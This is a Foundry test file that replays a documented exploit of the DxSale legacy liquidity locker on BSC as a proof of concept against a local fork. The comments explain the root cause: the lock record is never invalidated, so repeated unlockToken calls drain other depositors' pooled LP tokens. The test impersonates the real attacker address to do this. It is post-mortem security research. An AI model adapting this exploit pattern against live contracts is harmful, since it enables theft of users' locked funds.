// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$7.3M USD (across the full campaign; this PoC reproduces
// the actual mechanism with real, nonzero profit on one concrete real position)
// Attacker : 0xC4574DDEF299e7E563971e200433e592EeaaFA69
// Vulnerable Contract : 0xEb3a9C56d963b971d320f889bE2fb8B59853e449 (DxSale Legacy Liquidity Locker)
// Real drain tx replayed here : 0xb107f19af1a8ff90d19cbb40d935f8be5d79f5fb9b497824e4ed28b9e7555fe9
//   (block 100,812,090, BSC) - 5x repeated unlockToken(0) calls in one tx.
//
// ROOT CAUSE (confirmed by replaying the real attacker's calls against a BSC
// archive fork - see DxSale_exp.md for the full derivation):
//   unlockToken(uint256 userLockerNumber) in the verified 0.6.12 legacy locker
//   NEVER invalidates the withdrawn lock record. It only conditionally flips
//   `locked = false` if `block.timestamp > lockedTime` - for any lock whose
//   timelock has NOT yet expired (the normal case), `locked` stays `true` and
//   `lockedAmount` stays unchanged FOREVER, even after a successful payout.
//   Since the only re-entry gate is `require(locked)` (not "already withdrawn"),
//   the ORIGINAL DEPOSITOR can call unlockToken() on their own lock slot an
//   UNLIMITED number of times, each time paying out `lockedAmount` again from
//   the contract's balance of that LP token - a balance POOLED ACROSS ALL
//   depositors of the same LP pair. Every call after the first is a direct
//   theft of OTHER users' locked funds via the shared pool, gated only by
//   `require(IERC20(lpAddress).balanceOf(address(this)) >= payoutAmount)`.
//
// This PoC replays the EXACT real position (attacker's lock #0, Cake-LP pair
// 0x88DA6Bc3...) at the EXACT real block, and calls unlockToken(0) 5 times -
// mirroring the real on-chain transaction's 5 onUnlock() events precisely.

interface IDxSaleLocker {
    function unlockToken(uint256 userLockerNumber) external;
    function UserLockerCount(address user) external view returns (uint256);
    function DXLOCKERLP(address user, uint256 n) external view returns (
        bool exists_, bool locked_, string memory logo, uint256 lockedAmount, uint256 lockedTime, uint256 startTime, address lpAddress
    );
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract DxSaleExploitTest is Test {
    IDxSaleLocker constant LOCKER = IDxSaleLocker(0xEb3a9C56d963b971d320f889bE2fb8B59853e449);
    IERC20 constant CAKE_LP = IERC20(0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2);
    address constant ATTACKER = 0xC4574DDEF299e7E563971e200433e592EeaaFA69;
    uint256 constant FORK_BLOCK = 100_812_089; // one block before the real 5x-drain tx

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        vm.label(address(LOCKER), "DxSale_Legacy_Locker");
        vm.label(address(CAKE_LP), "Cake-LP (victim pair)");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public {
        console.log("--- DxSale Legacy Locker: repeated unlockToken() drain ---");

        uint256 poolBefore = CAKE_LP.balanceOf(address(LOCKER));
        uint256 attackerBefore = CAKE_LP.balanceOf(ATTACKER);
        console.log("Locker's pooled Cake-LP balance before:", poolBefore);
        console.log("Attacker's Cake-LP balance before:", attackerBefore);

        (bool exists_, bool locked_, , uint256 lockedAmount, uint256 lockedTime, , ) =
            LOCKER.DXLOCKERLP(ATTACKER, 0);
        console.log("Attacker's lock #0 exists:", exists_);
        console.log("Attacker's lock #0 locked:", locked_);
        console.log("Attacker's lock #0 lockedAmount:", lockedAmount);
        console.log("Attacker's lock #0 unlockTime (still years in the future):", lockedTime);
        console.log("block.timestamp:", block.timestamp);
        assertTrue(lockedTime > block.timestamp, "sanity: this lock's real timelock has NOT expired");

        vm.startPrank(ATTACKER);

        uint256 REPLAY_CALLS = 5; // matches the real tx's 5 onUnlock() events exactly
        for (uint256 i = 0; i < REPLAY_CALLS; i++) {
            LOCKER.unlockToken(0);
            console.log("unlockToken(0) call #", i + 1, "succeeded");
        }

        vm.stopPrank();

        uint256 attackerAfter = CAKE_LP.balanceOf(ATTACKER);
        uint256 poolAfter = CAKE_LP.balanceOf(address(LOCKER));

        console.log("Attacker's Cake-LP balance after 5 calls:", attackerAfter);
        console.log("Locker's pooled Cake-LP balance after:", poolAfter);

        uint256 totalExtracted = attackerAfter - attackerBefore;
        uint256 fairShare = lockedAmount; // what the attacker actually deposited, once
        uint256 stolenFromOtherDepositors = totalExtracted - fairShare;

        console.log("Total Cake-LP extracted (5 calls):", totalExtracted);
        console.log("Attacker's fair share (1 deposit):", fairShare);
        console.log("Stolen from OTHER depositors' pooled funds:", stolenFromOtherDepositors);

        // HARM ASSERTION (not just "the function is callable"): the attacker's
        // wallet ends up holding MORE Cake-LP than they ever deposited, extracted
        // from the SAME shared pool that backs every other depositor's locked
        // position for this LP pair - direct, quantified fund loss to others.
        assertEq(totalExtracted, REPLAY_CALLS * lockedAmount, "expected exactly 5x payout");
        assertGt(stolenFromOtherDepositors, 0, "attacker must extract MORE than their own deposit");
        assertEq(poolBefore - poolAfter, totalExtracted, "pool must have paid out the full extracted amount");
    }
}
